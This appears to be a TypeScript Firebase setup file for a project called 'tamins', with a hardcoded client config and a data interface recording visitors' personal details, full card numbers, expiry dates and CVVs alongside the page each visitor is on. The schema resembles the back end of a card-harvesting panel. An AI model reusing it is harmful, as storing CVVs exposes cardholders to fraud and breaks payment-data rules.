import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDp_uI4zO6I3D5h8G1MK1bCAjIqH8prbJc",
  authDomain: "tamins-86ba3.firebaseapp.com",
  projectId: "tamins-86ba3",
  storageBucket: "tamins-86ba3.firebasestorage.app",
  messagingSenderId: "952748602321",
  appId: "1:952748602321:web:04ef672e0d44b70d5566f0",
  measurementId: "G-EB2WJPP7FP"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
